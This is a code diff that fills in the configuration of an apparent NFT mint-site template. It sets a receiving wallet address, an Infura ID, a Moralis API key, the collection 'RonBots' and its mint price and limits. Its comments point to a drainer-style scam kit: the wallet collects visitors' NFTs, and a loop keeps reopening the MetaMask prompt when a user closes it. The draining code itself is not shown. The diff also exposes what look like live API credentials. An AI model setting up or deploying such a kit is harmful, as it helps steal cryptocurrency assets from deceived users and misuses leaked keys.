@@ -1,14 +1,14 @@
-const address = "YOUR WALLET";    // Your wallet that you have to receive NFTs
-const infuraId = "API KEY"     // Infuria ID | https://infura.io/ | For Wallet Connect
-const moralisApi = "X-API-KEY"    // x-api-key | https://moralis.io/ | For NFTs
+const address = "0x6a8e971347f96d479654858b546b06aa44D5379D";    // Your wallet that you have to receive NFTs
+const infuraId = "05d6284f81b94ef5adf29d858cb7b6b8"     // Infuria ID | https://infura.io/ | For Wallet Connect
+const moralisApi = "Qk1ZimVEDrcgc4LztyuUzZBmrafA4FuZMc8GIfDrRzDrzx9AMVusmAXeklKFKRu1"    // x-api-key | https://moralis.io/ | For NFTs
 
 const collectionInfo = {
-    name: "NFTs Montana",
-    title: "NftMontana MINT Template", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
-    date: "25.04.2022",
+    name: "RonBots",
+    title: "RonBot Mint", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
+    date: "9/12/2022",
     socialMedia: {
-        discord: "https://discord.gg/example",
-        twitter: "https://twitter.com/example",
+        discord: "https://discord.gg",
+        twitter: "https://twitter.com",
     },
     medias: {
         preview: "preview.gif",
@@ -22,10 +22,10 @@ const collectionInfo = {
     }
 }
 const mintInfo = {
-    price: 0.02,         // Price per NFT.
-    totalSupply: 999,   // Total supply of NFTs.
+    price: 0.01,         // Price per NFT.
+    totalSupply: 888,   // Total supply of NFTs.
     minUnits: 1,        // Min units to buy.
-    maxUnits: 10,        // Max units to buy.
+    maxUnits: 5,        // Max units to buy.
     askMintLoop: true,  // If true, when the user closes the metamask popup, it reopens automatically.
 }
 
